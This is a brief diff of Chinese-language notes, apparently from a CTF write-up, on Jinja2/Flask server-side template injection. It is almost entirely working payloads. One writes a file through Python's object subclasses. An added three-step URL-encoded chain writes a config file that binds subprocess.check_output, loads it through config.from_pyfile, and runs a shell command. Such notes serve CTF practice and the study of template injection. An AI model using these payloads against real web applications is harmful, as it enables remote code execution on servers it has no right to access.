@@ -15,3 +15,9 @@ en， 果然不能用,大概到func_globals['linecache']就会报错，好像是
 #写文件：
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
 ```
+
+看wp
+`
+name=%7B%7B ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') %7D%7D
+name=%7B%7B config.from_pyfile('/tmp/owned.cfg') %7D%7D 
+name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D
